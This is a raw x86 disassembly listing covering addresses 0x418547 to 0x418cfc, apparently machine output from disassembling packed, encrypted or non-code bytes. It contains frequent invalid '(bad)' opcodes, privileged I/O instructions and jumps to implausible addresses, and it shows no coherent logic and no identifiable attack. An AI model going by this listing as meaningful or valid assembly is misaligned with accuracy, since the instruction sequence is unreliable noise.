  418547:	adc    BYTE PTR [edi+0x70e8c53a],bl
  41854d:	jl     0x418580
  41854f:	mov    eax,ds:0x4b617b68
  418554:	or     esi,ebx
  418556:	(bad)  
  418557:	push   ebp
  418558:	adc    eax,0xc360ff54
  41855d:	int    0xa7
  41855f:	inc    esp
  418560:	or     al,BYTE PTR [ebx]
  418562:	or     dl,BYTE PTR [ebp-0x74]
  418565:	xor    DWORD PTR [esi+eiz*4],edx
  418568:	addr16 push ebp
  41856a:	and    bh,BYTE PTR [ecx-0x6ff47b52]
  418570:	lods   al,BYTE PTR ds:[esi]
  418571:	inc    bh
  418573:	test   ah,ah
  418575:	dec    esp
  418576:	test   eax,0x96939977
  41857b:	lahf   
  41857c:	popa   
  41857d:	inc    esi
  41857e:	and    cl,BYTE PTR [edx-0x70]
  418581:	adc    BYTE PTR [ecx+ecx*1],cl
  418584:	add    ebx,DWORD PTR [esi-0x4b]
  418587:	int3   
  418588:	mov    esi,0xce473925
  41858d:	lock jae 0x41859d
  418590:	cld    
  418591:	mov    al,ds:0xdf3f4ad
  418596:	pop    es
  418597:	nop
  418598:	lods   al,BYTE PTR ds:[esi]
  418599:	cmp    esp,DWORD PTR [eax-0x77]
  41859c:	je     0x41856c
  41859e:	jne    0x4185b5
  4185a0:	mov    DWORD PTR [eax],edi
  4185a2:	jb     0x418597
  4185a4:	mov    ebp,0xf05919dd
  4185a9:	mov    bh,0x8d
  4185ab:	out    0xe0,al
  4185ad:	dec    eax
  4185ae:	aaa    
  4185af:	adc    cl,ch
  4185b1:	pop    ds
  4185b2:	xor    eax,0x73628294
  4185b7:	push   ds
  4185b8:	sub    DWORD PTR ds:0x794d00cd,0xffffffe1
  4185bf:	xchg   esi,eax
  4185c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185c1:	fidivr DWORD PTR [edi]
  4185c3:	sub    ch,BYTE PTR [edx]
  4185c5:	or     DWORD PTR ds:0x5dce89f4,0x40
  4185cc:	or     BYTE PTR [edi-0x6ca5b985],cl
  4185d2:	out    0x5b,eax
  4185d4:	iret   
  4185d5:	jne    0x41857d
  4185d7:	bound  eax,QWORD PTR [ecx+eax*4]
  4185da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185db:	push   ecx
  4185dc:	xchg   edx,eax
  4185dd:	sti    
  4185de:	inc    eax
  4185df:	inc    esi
  4185e0:	pop    ecx
  4185e1:	dec    eax
  4185e2:	adc    BYTE PTR [edi+esi*1+0x110f00ff],bl
  4185e9:	jp     0x418610
  4185eb:	or     eax,0x557e096f
  4185f0:	xchg   ecx,eax
  4185f1:	pop    eax
  4185f2:	(bad)  [ebx-0xdf0556b]
  4185f8:	cmc    
  4185f9:	jo     0x418661
  4185fb:	loopne 0x4185c4
  4185fd:	sbb    bl,dl
  4185ff:	xor    DWORD PTR [edx-0x108abbf1],0x796eb6f5
  418609:	loopne 0x4185b2
  41860b:	mov    ds:0x9c35b76e,al
  418610:	fs out dx,al
  418612:	cmp    dh,BYTE PTR [edi+0x45]
  418615:	mov    ecx,DWORD PTR [esp+edi*2-0x3e]
  418619:	leave  
  41861a:	pop    eax
  41861b:	in     eax,dx
  41861c:	and    dh,cl
  41861e:	dec    esi
  41861f:	pop    DWORD PTR [edi-0x71fad1bf]
  418625:	sub    ebp,edx
  418627:	dec    edi
  418628:	stos   BYTE PTR es:[edi],al
  418629:	cld    
  41862a:	inc    edi
  41862b:	repz fs mov eax,0x2def06e4
  418632:	or     bh,ch
  418634:	or     DWORD PTR [edx],eax
  418636:	mov    bh,BYTE PTR [edx+edx*4]
  418639:	nop
  41863a:	(bad)  
  41863b:	jns    0x4185f9
  41863d:	je     0x418601
  41863f:	dec    esp
  418640:	dec    BYTE PTR [ebx+0x43]
  418643:	clc    
  418644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418645:	mov    ecx,0xe665e960
  41864a:	pop    ecx
  41864b:	xchg   ebx,eax
  41864c:	add    eax,0x2a41e219
  418651:	in     eax,0x70
  418653:	in     al,dx
  418654:	(bad)  
  418655:	std    
  418656:	xchg   ecx,eax
  418657:	fcomp  QWORD PTR [ebp+eax*4+0x28]
  41865b:	xor    eax,0x458cfad2
  418660:	fnsave [ebx-0x1270f9ba]
  418666:	popf   
  418667:	adc    al,0x77
  418669:	cdq    
  41866a:	cli    
  41866b:	mov    ecx,0x266e28
  418670:	aam    0x60
  418672:	test   eax,0x809cdd00
  418677:	leave  
  418678:	cmp    al,0xe9
  41867a:	push   DWORD PTR [esi]
  41867c:	fadd   DWORD PTR [esi-0x298beccf]
  418682:	adc    DWORD PTR [edx+0x13b81bcd],esp
  418688:	arpl   WORD PTR [ebp+0x70488bd9],bp
  41868e:	adc    ebp,DWORD PTR [ebp-0x3ed367f1]
  418694:	push   ecx
  418695:	cmp    BYTE PTR [esi-0x7d2dcd83],bh
  41869b:	scas   al,BYTE PTR es:[edi]
  41869c:	in     al,0xfd
  41869e:	lods   eax,DWORD PTR ds:[esi]
  41869f:	fimul  WORD PTR [esi]
  4186a1:	(bad)  
  4186a2:	sub    eax,0x433bb579
  4186a7:	das    
  4186a8:	and    eax,ebp
  4186aa:	movups XMMWORD PTR [edi-0x9],xmm3
  4186ae:	scas   al,BYTE PTR es:[edi]
  4186af:	mov    eax,ds:0xb3703bae
  4186b4:	mov    ch,0xed
  4186b6:	add    BYTE PTR [ecx+0x66],bl
  4186b9:	pop    es
  4186ba:	rcl    BYTE PTR [eax],1
  4186bc:	push   es
  4186bd:	push   ss
  4186be:	pop    edi
  4186bf:	add    DWORD PTR [edi+0x1d],edx
  4186c2:	mov    ebx,0x815f11aa
  4186c7:	das    
  4186c8:	cmp    al,bh
  4186ca:	test   bh,bh
  4186cc:	inc    DWORD PTR [edi-0x75]
  4186cf:	inc    ebp
  4186d0:	retf   
  4186d1:	adc    al,0xb5
  4186d3:	stc    
  4186d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186d5:	pop    ss
  4186d6:	and    esi,ecx
  4186d8:	nop
  4186d9:	jg     0x4186e6
  4186db:	jle    0x4186f7
  4186dd:	xchg   esp,eax
  4186de:	ror    DWORD PTR [eax+eiz*1-0x5d],cl
  4186e2:	dec    edi
  4186e3:	mov    al,ds:0xddb15a86
  4186e8:	(bad)  
  4186e9:	por    mm7,QWORD PTR [ecx+0x97223d8]
  4186f0:	inc    ebp
  4186f1:	xor    edi,DWORD PTR ds:0x207917b0
  4186f7:	xor    al,0x33
  4186f9:	jle    0x4186c3
  4186fb:	pop    edx
  4186fc:	push   ebx
  4186fd:	cs ret 
  4186ff:	push   esp
  418700:	cmc    
  418701:	mov    edx,?
  418703:	mov    ch,0x14
  418705:	fisub  WORD PTR [esi+0x1d5e65f]
  41870b:	sub    ebx,DWORD PTR [eax+0x7ef0c3b3]
  418711:	jae    0x418714
  418713:	cld    
  418714:	call   0x18edd545
  418719:	mov    al,dl
  41871b:	aas    
  41871c:	(bad)  [edx+esi*1]
  41871f:	add    ah,BYTE PTR [edx]
  418721:	mov    al,0x33
  418723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418724:	in     al,dx
  418725:	pusha  
  418726:	jne    0x4187a1
  418728:	mov    ecx,0xaafb1313
  41872d:	sar    al,0x8a
  418730:	cmp    BYTE PTR [esi-0x4b],0xf2
  418734:	mov    eax,0x31be446d
  418739:	(bad)  
  41873a:	cs xor al,0xb3
  41873d:	lds    ebp,FWORD PTR [edi-0x7aa4af7f]
  418743:	in     eax,0x51
  418745:	cwde   
  418746:	arpl   WORD PTR [eax-0x30],cx
  418749:	out    0xe3,eax
  41874b:	mul    DWORD PTR [edi]
  41874d:	or     al,0xd8
  41874f:	enter  0x6f0e,0x33
  418753:	inc    ebx
  418754:	call   0xc4c001fc
  418759:	xchg   BYTE PTR [ebx+eax*1],ah
  41875c:	mov    eax,0xcb710728
  418761:	ret    0x4c1d
  418764:	retf   
  418765:	retf   
  418766:	push   eax
  418767:	jp     0x418730
  418769:	mov    edx,0x2dcf4f0
  41876e:	into   
  41876f:	inc    ebp
  418770:	lods   eax,DWORD PTR ds:[esi]
  418771:	ror    DWORD PTR [esi+edx*4-0x5139992],1
  418778:	out    dx,al
  418779:	fsubr  QWORD PTR [eax]
  41877b:	cli    
  41877c:	add    al,0xc0
  41877e:	or     eax,0xdf2df193
  418783:	inc    ebp
  418784:	repnz mov edi,0xe89edaac
  41878a:	cmp    BYTE PTR ds:0xb2646cf0,ah
  418790:	(bad)  
  418791:	stos   BYTE PTR es:[edi],al
  418792:	sbb    al,0x6d
  418794:	jno    0x418742
  418796:	cmp    ebx,DWORD PTR [ecx-0xf]
  418799:	fst    QWORD PTR [eax]
  41879b:	in     al,dx
  41879c:	jo     0x418799
  41879e:	mov    gs,WORD PTR fs:[eax+0xa4d28ea]
  4187a5:	in     eax,0xd8
  4187a7:	enter  0x75e4,0xb7
  4187ab:	push   0xffffff95
  4187ad:	push   gs
  4187af:	push   ds
  4187b0:	iret   
  4187b1:	jae    0x41882b
  4187b3:	outs   dx,BYTE PTR ds:[esi]
  4187b4:	mov    ?,WORD PTR [edx+0x39]
  4187b7:	inc    ebp
  4187b8:	xor    ecx,ebx
  4187ba:	add    eax,0xf5b1de09
  4187bf:	xchg   ebx,esi
  4187c1:	cdq    
  4187c2:	ins    DWORD PTR es:[edi],dx
  4187c3:	jmp    0x48d761c6
  4187c8:	rcr    BYTE PTR [edx],0x5e
  4187cb:	push   edx
  4187cc:	dec    ecx
  4187cd:	les    eax,FWORD PTR [edi+0x61]
  4187d0:	and    ah,BYTE PTR [edi+0x55]
  4187d3:	mov    esp,0x50a78e5e
  4187d8:	adc    BYTE PTR [eax],bh
  4187da:	cdq    
  4187db:	sbb    eax,0x67801971
  4187e0:	inc    ebx
  4187e1:	imul   esp,DWORD PTR [edi],0xfa5142e5
  4187e7:	outs   dx,BYTE PTR ds:[esi]
  4187e8:	sbb    dl,BYTE PTR [edi-0x77]
  4187eb:	call   0x5d652dab
  4187f0:	fld    st(2)
  4187f2:	dec    edx
  4187f3:	cli    
  4187f4:	push   edi
  4187f5:	mov    esp,0xe974d563
  4187fa:	mov    WORD PTR [eax-0x7b],ss
  4187fd:	imul   esi,DWORD PTR [ebx],0xf519052a
  418803:	lods   al,BYTE PTR ds:[esi]
  418804:	cld    
  418805:	in     eax,0x9b
  418807:	cmp    ch,bh
  418809:	arpl   bx,bp
  41880b:	pop    edx
  41880c:	xchg   ebx,eax
  41880d:	(bad)  
  41880e:	cli    
  41880f:	ret    
  418810:	out    dx,al
  418811:	scas   al,BYTE PTR es:[edi]
  418812:	inc    edi
  418813:	push   edx
  418814:	push   eax
  418815:	aaa    
  418816:	push   ecx
  418817:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418819:	out    0xae,eax
  41881b:	retf   0x1cf
  41881e:	cmc    
  41881f:	xchg   esp,eax
  418820:	mov    eax,ds:0x69d169b
  418825:	dec    esi
  418826:	std    
  418827:	mov    ah,0xaf
  418829:	mov    bh,0xcd
  41882b:	adc    ch,al
  41882d:	cmp    bl,BYTE PTR [edi]
  41882f:	fidiv  DWORD PTR [eax]
  418831:	mov    edx,DWORD PTR [edi+ecx*8]
  418834:	mov    edi,0xa6dc7bed
  418839:	adc    dl,BYTE PTR [esi]
  41883b:	clc    
  41883c:	cli    
  41883d:	xchg   edi,eax
  41883e:	daa    
  41883f:	xor    esp,DWORD PTR [ebp-0x5cbbc5cb]
  418845:	cmp    dh,bl
  418847:	ins    DWORD PTR es:[edi],dx
  418848:	add    bh,ah
  41884a:	fwait
  41884b:	in     al,0x50
  41884d:	pusha  
  41884e:	mov    dl,0x4a
  418850:	test   al,0x3b
  418852:	lods   al,BYTE PTR ds:[esi]
  418853:	jb     0x418883
  418855:	mov    dl,0xd1
  418857:	adc    al,0xa5
  418859:	or     ebx,0xffffff8a
  41885c:	clc    
  41885d:	mov    ebx,0x6bcc81b8
  418862:	dec    edi
  418863:	sub    al,0x36
  418865:	push   es
  418866:	das    
  418867:	lds    ebp,FWORD PTR [esi+0x2b9de95d]
  41886d:	je     0x41885a
  41886f:	ds in  al,dx
  418871:	sub    eax,0xedb3abe0
  418876:	pop    ds
  418877:	stos   BYTE PTR es:[edi],al
  418878:	jae    0x418898
  41887a:	(bad)  
  41887b:	cld    
  41887c:	mov    eax,ds:0x33e082f5
  418881:	(bad)  
  418882:	cmp    DWORD PTR [eax+0x43066a90],esi
  418888:	dec    esi
  418889:	push   ds
  41888a:	shl    BYTE PTR [ecx],0xe0
  41888d:	jo     0x41886a
  41888f:	test   eax,0x9dd106cf
  418894:	arpl   WORD PTR [eax],bp
  418896:	imul   edi,DWORD PTR [eax+0x7a],0x82231fce
  41889d:	jb     0x4188b4
  41889f:	or     DWORD PTR [eax-0x4c],0xffffff84
  4188a3:	mov    dh,0x22
  4188a5:	and    DWORD PTR [edi],ebx
  4188a7:	shl    eax,1
  4188a9:	fnsave [edx-0x6f]
  4188ac:	pop    es
  4188ad:	adc    ebp,DWORD PTR [ebp+0x21057526]
  4188b3:	and    esi,ecx
  4188b5:	dec    edi
  4188b6:	test   al,0x41
  4188b8:	push   esi
  4188b9:	mov    ecx,0x2be7528f
  4188be:	jbe    0x418939
  4188c0:	aam    0xf1
  4188c2:	pop    edx
  4188c3:	cli    
  4188c4:	inc    eax
  4188c5:	test   edx,ecx
  4188c7:	push   0x4dbf69bc
  4188cc:	mov    WORD PTR [ebp+0x7b2f17eb],gs
  4188d2:	mov    ds:0x97180cfa,eax
  4188d7:	adc    al,0x1d
  4188d9:	enter  0x8f63,0x6e
  4188dd:	xor    DWORD PTR [ebx-0x4c],eax
  4188e0:	dec    edx
  4188e1:	(bad)  
  4188e2:	xchg   ecx,eax
  4188e3:	pop    es
  4188e4:	data16 rol BYTE PTR [edi-0x4d],0xf7
  4188e9:	pop    ds
  4188ea:	(bad)  
  4188ec:	xor    al,0x8
  4188ee:	arpl   WORD PTR [edi],ax
  4188f0:	out    0xb5,eax
  4188f2:	push   esp
  4188f3:	iret   
  4188f4:	jnp    0x418960
  4188f6:	xchg   edi,eax
  4188f7:	xor    eax,0xc21517c
  4188fc:	jne    0x4188ef
  4188fe:	cli    
  4188ff:	jmp    0x41889d
  418901:	retf   
  418902:	stc    
  418903:	lods   al,BYTE PTR ds:[esi]
  418904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418905:	imul   ebx,DWORD PTR [ecx+0x5f],0xeb85bbe4
  41890c:	ss sub ecx,edi
  41890f:	jecxz  0x418909
  418911:	add    eax,0x4e3ccf7b
  418916:	cmp    eax,0xf1fbc2b9
  41891b:	jg     0x41894b
  41891d:	xchg   al,bh
  41891f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418920:	or     BYTE PTR [ecx-0x2e],al
  418923:	sub    BYTE PTR [ebx+0x6a9ebf53],cl
  418929:	push   ebx
  41892a:	mov    al,0x28
  41892c:	mov    ds:0xd0cb9763,eax
  418931:	es cs jno 0x418999
  418935:	mov    edx,0xf2a36cad
  41893a:	cli    
  41893b:	cmp    ecx,ecx
  41893d:	sbb    edi,DWORD PTR [edx]
  41893f:	xchg   edx,eax
  418940:	push   ebx
  418941:	test   eax,0x5649ab71
  418946:	pop    eax
  418947:	js     0x418994
  418949:	mov    WORD PTR [ebx-0x56],ss
  41894c:	adc    eax,DWORD PTR [edi]
  41894e:	loop   0x4188de
  418950:	data16 aam 0xf7
  418953:	(bad)  
  418954:	mov    esp,0x2bb78b2c
  418959:	xchg   BYTE PTR [edx+eiz*8],dh
  41895c:	jo     0x4188e9
  41895e:	inc    esi
  41895f:	shl    BYTE PTR [eax-0x7bc1f3e0],0x27
  418966:	imul   cx,si,0x40
  41896a:	vdivpd xmm5,xmm0,XMMWORD PTR [edi+0x4e]
  41896f:	loopne 0x418924
  418971:	mov    al,ds:0x65bf447
  418976:	inc    esi
  418977:	and    edx,ebx
  418979:	inc    ecx
  41897a:	addr16 leave 
  41897c:	mov    ds:0x4e4fa7d7,al
  418981:	or     BYTE PTR [eax-0x3bfb2a85],cl
  418987:	dec    ecx
  418988:	test   DWORD PTR ss:[edx+0x1edbb3b3],ecx
  41898f:	lods   al,BYTE PTR ds:[esi]
  418990:	mul    DWORD PTR [ecx]
  418992:	adc    ch,al
  418994:	cs out 0xa3,eax
  418997:	push   eax
  418998:	sahf   
  418999:	sub    dh,BYTE PTR [esi+ebx*1+0x77]
  41899d:	(bad)  
  41899e:	ret    0x2254
  4189a1:	pop    ebp
  4189a2:	loope  0x4189da
  4189a4:	int3   
  4189a5:	mov    dh,0xd1
  4189a7:	xchg   edi,eax
  4189a8:	mov    ds:0x85856ef7,eax
  4189ad:	adc    esp,DWORD PTR [esi]
  4189af:	outs   dx,BYTE PTR ds:[esi]
  4189b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b1:	or     al,0x0
  4189b3:	xchg   ebx,eax
  4189b4:	fwait
  4189b5:	idiv   BYTE PTR [edx]
  4189b7:	dec    esp
  4189b8:	adc    al,0xd8
  4189ba:	push   cs
  4189bb:	push   ds
  4189bc:	fdiv   QWORD PTR [ebp-0x43fb890e]
  4189c2:	and    BYTE PTR [ecx+eiz*8-0x51],ah
  4189c6:	push   esi
  4189c7:	push   esi
  4189c8:	fs sbb eax,0xac199e74
  4189ce:	ror    ecx,1
  4189d0:	add    eax,0x1238e42a
  4189d5:	adc    dh,bh
  4189d7:	ss iret 
  4189d9:	inc    ecx
  4189da:	pop    ebp
  4189db:	repnz push ss
  4189dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189de:	jae    0x418a5b
  4189e0:	dec    esi
  4189e1:	jnp    0x41896e
  4189e3:	imul   esp,DWORD PTR [edi+0x76],0x28a62d73
  4189ea:	jl     0x418977
  4189ec:	inc    ebx
  4189ed:	shl    bl,0x55
  4189f0:	pop    edx
  4189f1:	pop    ecx
  4189f2:	int3   
  4189f3:	sub    eax,0x8aec230d
  4189f8:	dec    edx
  4189f9:	mov    al,0xd9
  4189fb:	fdiv   st,st(1)
  4189fd:	scas   eax,DWORD PTR es:[edi]
  4189fe:	push   esp
  4189ff:	xchg   ecx,eax
  418a00:	and    al,BYTE PTR [esi+ebx*8+0x12abcdb2]
  418a07:	stos   BYTE PTR es:[edi],al
  418a08:	push   cs
  418a09:	dec    ecx
  418a0a:	jo     0x4189d9
  418a0c:	sub    DWORD PTR [edi],0x1196694d
  418a12:	lods   eax,DWORD PTR ds:[esi]
  418a13:	fcom   DWORD PTR [edx]
  418a15:	push   0x1d
  418a17:	cmp    edx,esp
  418a19:	xor    edx,DWORD PTR [eax+0x14]
  418a1c:	mul    DWORD PTR [edx-0x42]
  418a1f:	rcr    ch,1
  418a21:	fdiv   DWORD PTR [eax+edi*8-0x61]
  418a25:	or     bl,bl
  418a27:	adc    dl,BYTE PTR [esi]
  418a29:	sub    ebx,DWORD PTR [ebp-0x3c866af]
  418a2f:	inc    ebp
  418a30:	or     BYTE PTR [eax],cl
  418a32:	icebp  
  418a33:	(bad)  
  418a34:	repz or BYTE PTR [ebp+ecx*4-0x36],0xf5
  418a3a:	cmc    
  418a3b:	xchg   edx,eax
  418a3c:	imul   ebx,DWORD PTR [ecx+0x385ae3be],0xffffffc6
  418a43:	jmp    0xccb0a87b
  418a48:	inc    ebp
  418a49:	push   es
  418a4a:	mov    esp,0x114ca0d
  418a4f:	call   0x2ba8:0x38fd7e95
  418a56:	xor    esp,DWORD PTR [edi]
  418a58:	mov    eax,ds:0x5108b0ac
  418a5d:	es call 0x1e6c:0x60ef6004
  418a65:	mov    dh,0xed
  418a67:	xchg   ebp,eax
  418a68:	inc    edi
  418a69:	push   cs
  418a6a:	adc    DWORD PTR [ebx+esi*1+0x36],eax
  418a6e:	test   DWORD PTR [esp+ebx*4-0x47ee5707],ebx
  418a75:	and    edx,DWORD PTR [eax+0x4a0dd142]
  418a7b:	outs   dx,DWORD PTR ds:[esi]
  418a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a7d:	add    ecx,esp
  418a7f:	int3   
  418a80:	jbe    0x418a37
  418a82:	cmp    edx,DWORD PTR [ebp-0x19]
  418a85:	mov    eax,0x1b366fea
  418a8a:	mov    es,esi
  418a8c:	ret    
  418a8d:	inc    ebp
  418a8e:	int    0xb0
  418a90:	mov    dh,0xfb
  418a92:	leave  
  418a93:	js     0x418a9b
  418a95:	jl     0x418ad5
  418a97:	stos   BYTE PTR es:[edi],al
  418a98:	scas   eax,DWORD PTR es:[edi]
  418a99:	push   edx
  418a9a:	je     0x418ac1
  418a9c:	and    al,BYTE PTR [edi+0x4503eca0]
  418aa2:	ins    WORD PTR es:[edi],dx
  418aa4:	das    
  418aa5:	mov    al,ds:0x38c98f48
  418aaa:	jne    0x418a48
  418aac:	jp     0x418af2
  418aae:	and    eax,0x68efcc8a
  418ab3:	retf   0xc7b7
  418ab6:	and    esi,eax
  418ab8:	das    
  418ab9:	mov    dl,0xc4
  418abb:	sub    eax,0x7f763404
  418ac0:	in     al,0x37
  418ac2:	pushf  
  418ac3:	sbb    edx,DWORD PTR [edx-0x5c]
  418ac6:	push   ebx
  418ac7:	popf   
  418ac8:	es mov edx,0xe4d123a6
  418ace:	ja     0x418aa7
  418ad0:	jmp    0x16ad:0xda0e5b99
  418ad7:	mov    eax,ds:0x4e7269da
  418adc:	stos   WORD PTR es:[edi],ax
  418ade:	jmp    0x418a6f
  418ae0:	mov    eax,ss:0xdee477de
  418ae6:	retf   0xcb5
  418ae9:	clc    
  418aea:	mov    WORD PTR [eax+0x441171b3],fs
  418af0:	ins    BYTE PTR es:[edi],dx
  418af1:	aaa    
  418af2:	or     BYTE PTR ds:0x3b18e1be,ah
  418af8:	rcl    BYTE PTR [ebx+ebx*1+0x64],0xba
  418afd:	fbstp  TBYTE PTR [ebx+0x35f3fec3]
  418b03:	loope  0x418b67
  418b05:	ror    DWORD PTR [eax+ebx*1+0x1ca94b9d],1
  418b0c:	inc    eax
  418b0d:	jmp    0x418b07
  418b0f:	rcl    DWORD PTR [edi],cl
  418b11:	out    0x54,al
  418b13:	(bad)  
  418b14:	cmp    ebp,esi
  418b16:	inc    eax
  418b17:	ja     0x418b7d
  418b19:	add    eax,0xcd0931de
  418b1e:	pop    esi
  418b1f:	pop    ss
  418b20:	mov    ss,WORD PTR [edx]
  418b22:	mov    dl,0xda
  418b24:	aam    0x33
  418b26:	push   edi
  418b27:	ins    DWORD PTR es:[edi],dx
  418b28:	popa   
  418b29:	imul   BYTE PTR [ebx]
  418b2b:	ds pusha 
  418b2d:	pop    eax
  418b2e:	or     dl,BYTE PTR [ebx+eax*8-0x21]
  418b32:	(bad)  
  418b33:	int    0xcd
  418b35:	shr    BYTE PTR [esi-0x721e8a8],cl
  418b3b:	mov    eax,0x25267760
  418b40:	sbb    DWORD PTR es:[eax+edx*2],0xc
  418b45:	neg    BYTE PTR [eax]
  418b47:	sub    DWORD PTR [ecx+0x764f7d30],ebx
  418b4d:	xlat   BYTE PTR ds:[ebx]
  418b4e:	shr    BYTE PTR [esi-0x1b],1
  418b51:	xchg   edx,eax
  418b52:	in     al,0x84
  418b54:	xor    al,0x18
  418b56:	jp     0x418bc3
  418b58:	mov    edi,0x7c226126
  418b5d:	pop    ss
  418b5e:	int    0xe4
  418b60:	xchg   esi,eax
  418b61:	and    BYTE PTR [esi+0x58bd0686],ch
  418b67:	popa   
  418b68:	jae    0x418b00
  418b6a:	gs add esp,edx
  418b6d:	push   0xae6abbe0
  418b72:	(bad)  
  418b73:	(bad)  
  418b74:	stc    
  418b75:	lock ins BYTE PTR es:[edi],dx
  418b77:	fadd   QWORD PTR [eax]
  418b79:	sub    DWORD PTR [esp+ecx*4-0x47],ecx
  418b7d:	outs   dx,BYTE PTR ds:[esi]
  418b7e:	pop    ecx
  418b7f:	leave  
  418b80:	sbb    al,BYTE PTR [edi-0x4c443bab]
  418b86:	mov    ds:0xc65443be,al
  418b8b:	into   
  418b8c:	adc    DWORD PTR [ecx+0x4e],esi
  418b8f:	hlt    
  418b90:	or     esi,DWORD PTR [esi-0x15743f6]
  418b96:	lahf   
  418b97:	mov    ebp,0x6fbb8e72
  418b9c:	fist   DWORD PTR [eax+0x45c88895]
  418ba2:	retf   
  418ba3:	dec    esi
  418ba4:	jno    0x418be5
  418ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba7:	ins    DWORD PTR es:[edi],dx
  418ba8:	fdivr  DWORD PTR [edi+0x6c88db85]
  418bae:	sti    
  418baf:	outs   dx,DWORD PTR ds:[esi]
  418bb0:	ins    DWORD PTR es:[edi],dx
  418bb1:	push   eax
  418bb2:	dec    esi
  418bb3:	dec    ebp
  418bb4:	pop    ebp
  418bb5:	or     eax,0x7c7bcb1c
  418bba:	sub    BYTE PTR [ebp+0x7b575134],dl
  418bc0:	daa    
  418bc1:	stos   DWORD PTR es:[edi],eax
  418bc2:	xchg   edx,eax
  418bc3:	xchg   esp,eax
  418bc4:	sbb    BYTE PTR ds:0x1868dd0f,bh
  418bca:	shl    edi,cl
  418bcc:	call   0x1f0d9453
  418bd1:	ret    
  418bd2:	out    dx,eax
  418bd3:	lea    edi,[eax]
  418bd5:	arpl   WORD PTR [eax],sp
  418bd7:	les    ebp,FWORD PTR [ebx-0x3b]
  418bda:	pop    ebp
  418bdb:	fnstsw WORD PTR gs:[ecx]
  418bde:	or     ch,cl
  418be0:	dec    ebx
  418be1:	mov    bh,0x8
  418be3:	lahf   
  418be4:	outs   dx,DWORD PTR ds:[esi]
  418be5:	iret   
  418be6:	(bad)  
  418be7:	jns    0x418c0c
  418be9:	and    eax,0x7bfbd913
  418bee:	jb     0x418c2e
  418bf0:	and    BYTE PTR [esi],0xbe
  418bf3:	cld    
  418bf4:	and    BYTE PTR [esi-0x7a],0x4c
  418bf8:	outs   dx,BYTE PTR ds:[esi]
  418bf9:	mov    eax,ds:0xbdf04443
  418bfe:	ret    0x3a93
  418c01:	mov    esp,0xa8a2c3fc
  418c06:	xor    edi,DWORD PTR [eax]
  418c08:	call   0xab5a:0x6076
  418c0e:	jl     0x418bbe
  418c10:	addr16 jo 0x418b9e
  418c13:	and    eax,0x466a9d54
  418c18:	out    0xed,al
  418c1a:	fs out dx,eax
  418c1c:	inc    ecx
  418c1d:	mov    dh,0xa3
  418c1f:	dec    esp
  418c20:	movntq QWORD PTR [eax+edx*2+0x4a],mm3
  418c25:	sbb    esi,DWORD PTR [ebp-0x554d4dc0]
  418c2b:	gs out 0xb0,eax
  418c2e:	fadd   QWORD PTR [ebp+0x2d]
  418c31:	in     eax,0x1b
  418c33:	jno    0x418be1
  418c35:	push   cs
  418c36:	retf   0x7490
  418c39:	or     BYTE PTR [ebx+0xb],bl
  418c3c:	jne    0x418c4e
  418c3e:	das    
  418c3f:	fisub  WORD PTR [ebx+0x4d]
  418c42:	xchg   BYTE PTR [edx+ebx*4+0x225f8038],cl
  418c49:	fxch   st(1)
  418c4b:	mov    al,0x95
  418c4d:	mov    ds:0xd7a8fee1,al
  418c52:	ins    BYTE PTR es:[edi],dx
  418c53:	inc    edi
  418c54:	(bad)  
  418c55:	in     eax,0x60
  418c57:	push   0xffffffad
  418c59:	dec    edi
  418c5a:	mov    cl,0x4c
  418c5c:	sbb    BYTE PTR [eax-0x6a],0x71
  418c60:	mov    fs,WORD PTR [ecx+esi*2+0x27b5d55b]
  418c67:	push   esp
  418c68:	shl    BYTE PTR [edx+0x30a5d1e2],cl
  418c6e:	sbb    al,0xcb
  418c70:	test   BYTE PTR [edx-0x1b6860ff],al
  418c76:	retf   0x765c
  418c79:	sbb    ecx,DWORD PTR [edx+0x66bc1df2]
  418c7f:	call   0x26c2018d
  418c84:	xchg   ebx,eax
  418c85:	arpl   WORD PTR [edx-0x37a657b6],di
  418c8b:	pop    esp
  418c8c:	pop    ebx
  418c8d:	jp     0x418c2b
  418c8f:	and    DWORD PTR [ebx+0x5b],edi
  418c92:	mov    al,BYTE PTR [edx+0x1d048603]
  418c98:	mov    ebp,0x3ff16301
  418c9d:	adc    dh,BYTE PTR [eax+ebp*1+0x35f861a7]
  418ca4:	push   0x6f
  418ca6:	jnp    0x418d1c
  418ca8:	xchg   dl,bl
  418caa:	daa    
  418cab:	inc    ebx
  418cac:	or     esp,DWORD PTR [edi-0xa]
  418caf:	and    ebp,DWORD PTR [ebp+0x1d422b7b]
  418cb5:	adc    eax,0x5ee662a6
  418cba:	(bad)  
  418cbb:	xor    dl,BYTE PTR [esi]
  418cbd:	mov    esp,DWORD PTR [eax]
  418cbf:	(bad)  
  418cc0:	jmp    0x418d0e
  418cc2:	popaw  
  418cc4:	not    BYTE PTR [edx-0x40]
  418cc7:	inc    edi
  418cc8:	(bad)  
  418cc9:	push   0x23
  418ccb:	dec    ebp
  418ccc:	xchg   edi,eax
  418ccd:	xchg   edx,eax
  418cce:	add    esi,esi
  418cd0:	xchg   ah,dl
  418cd2:	add    ecx,DWORD PTR [edx+0x1c]
  418cd5:	mov    ds:0x650d3166,al
  418cda:	inc    ebx
  418cdb:	pop    esp
  418cdc:	in     eax,dx
  418cdd:	inc    edx
  418cde:	nop
  418cdf:	dec    BYTE PTR [eax+0x28360c65]
  418ce5:	mov    al,ds:0xfd177f3d
  418cea:	xor    bh,BYTE PTR [ecx-0x4]
  418ced:	pusha  
  418cee:	int    0xbe
  418cf0:	inc    esi
  418cf1:	rcr    ah,0x67
  418cf4:	dec    ebx
  418cf5:	mov    eax,cs
  418cf7:	pop    ecx
  418cf8:	int3   
  418cf9:	mov    ebp,DWORD PTR [ecx+0x77]
  418cfc:	fild   DWORD PTR [edx+0x7b7e07bc]
